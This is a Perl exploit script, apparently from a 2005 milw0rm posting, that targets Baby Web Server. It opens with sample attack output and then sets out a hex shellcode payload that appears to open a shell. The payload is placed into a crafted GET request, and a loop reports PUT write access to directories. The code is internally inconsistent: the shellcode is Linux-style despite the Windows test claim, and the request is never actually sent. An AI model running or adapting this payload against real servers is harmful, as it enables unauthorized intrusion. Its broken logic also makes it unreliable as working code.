#!/bin/perl
#
#     Baby Web Server Command Validation Exploit
# --------------------------------------------------
#        Infam0us Gr0up - Securiti Research
#
#
# E:\>nc -v localhost 80
# Infam0us-Gr0up [127.0.0.1] 80 (http) open
# GET HTTP
#
# HTTP/1.0 400 Bad Request
# Server: Baby Web Server < --
# Set-Cookie: SESSIONID=00000001; path=/;version=1
# Last-Modified: Tue, 12 Jul 2005 06:43:05 GMT
#
#
# E:\PERL>perl babyws.pl localhost test.txt E:\Website\www04\ad\index.html
#
# [+] Connecting to localhost..
# [+] Connected
# [+] Create Spl0it..
# [+] Sending Command Validation..
# [+] Now attacking..
# [+] Domain: localhost
# [+] Path:E: E:\Website\www04\ad\index.html
# [+] 0wned!
#
# Tested on Windows2000 SP4 (Win NT)
# Info : basher13@linuxmail.org / infamous.2hell.com
# Vendor URL: http://www.pablosoftwaresolutions.com/


use IO::Socket;
if(@ARGV!=3){
print "    Baby Web Server Command Validation Exploit \n";
print "----------------------------------------------------\n";
print "     Infam0us Gr0up - Securiti Research\n\n";
print "[-]Usage: babyws.pl [target] [input] [path_file]\n";
print "[?]Exam:  babyws.pl localhost test.txt e:\www\site01\default.htm\n\n";
exit(1);
}

$site = $ARGV[0];

my $infile = $ARGV[1];
my $path = $ARGV[2];

print "\n\n";
print "[+] Connecting to $site..\n";

$sock = IO::Socket::INET->new(
PeerAddr => "$ARGV[0]",
PeerPort => 80,
Proto => "tcp")
or die "Unable to connect";

print "[+] Connected\n";
print "[+] Create Spl0it..\n";

$sploit =
"\xeb\x6e\x5e\x29\xc0\x89\x46\x10".
"\x40\x89\xc3\x89\x46\x0c\x40\x89".
"\x46\x08\x8d\x4e\x08\xb0\x66\xcd".
"\x40\x89\xc3\x89\x46\x0c\x40\x89".
"\x46\x08\x8d\x4e\x08\xb0\x66\xcd".
"\x80\x43\xc6\x46\x10\x10\x88\x46".
"\x08\x31\xc0\x31\xd2\x89\x46\x18".
"\xb0\x90\x66\x89\x46\x16\x8d\x4e".
"\x14\x89\x4e\x0c\x8d\x4e\x08\xb0".
"\x66\xcd\x80\x89\x5e\x0c\x43\x43".
"\xb0\x66\xcd\x80\x89\x56\x0c\x89".
"\x08\x31\xc0\x31\xd2\x89\x46\x18".
"\xb0\x90\x66\x89\x46\x16\x8d\x4e".
"\x14\x89\x4e\x0c\x8d\x4e\x08\xb0".
"\x56\x10\xb0\x66\x43\xcd\x80\x86".
"\xc3\xb0\x3f\x29\xc9\xcd\x80\xb0".
"\x14\x89\x4e\x0c\x8d\x4e\x08\xb0".
"\x66\xcd\x80\x89\x5e\x0c\x43\x43".
"\xb0\x66\xcd\x80\x89\x56\x0c\x89".
"\x56\x10\xb0\x66\x43\xcd\x80\x86".
"\xc3\xb0\x3f\x29\xc9\xcd\x80\xb0".
"\x3f\x41\xcd\x80\xb0\x3f\x41\xcd".
"\x80\x88\x56\x07\x89\x76\x0c\x87".
"\xf3\x8d\x4b\x0c\xb0\x0b\xcd\x80".
"\xe8\x8d\xff\xff";


print "[+] Sending Command Validation..\n";
open(OUT, ">$path") or die("unable to open $path: $!");
open(IN, $infile) or die("unable to open $infile: $!");
@directories=<IN>;

$blah = "GET $sploit HTTP/1.0\nHost: $site\nContent-length: 4\nTEST\n";

print "[+] Now attacking..\n";

foreach (@directories) {
       chomp;
       print OUT "$_ --> ";
       s/ /%20/g;
        my $repl = (qq(PUT /$_/test.txt $blah));

       if ($repl =~ /not allowed/i) { print OUT "Not Allowed\n"; }
       elsif ($repl =~ /403.4 Forbidden: SSL required/i) { print OUT "* 403.4 Forbidden: SSL required *\n"; }
       elsif ($repl =~ /401 Unauthorized/i) { print OUT "401 Unauthorized\n"; }
       elsif ($repl =~ /Error 404/i) { print OUT "Error 404\n"; }
       elsif ($repl =~ /Write Access Forbidden/i) { print OUT "Write Access Forbidden\n"; }
       elsif ($repl =~ /Unauthorized due to ACL on resource/i) { print OUT "Unauthorized due to ACL on resource\n"; }
       else { print OUT "*** SUCCESSFULL PUT ***\n"; }
}
close($sock);
print "[+] Domain: $site\n";
print "[+] Path: $ARGV[2]\n";
print "[+] 0wned!\n";
exit();

# milw0rm.com [2005-07-11]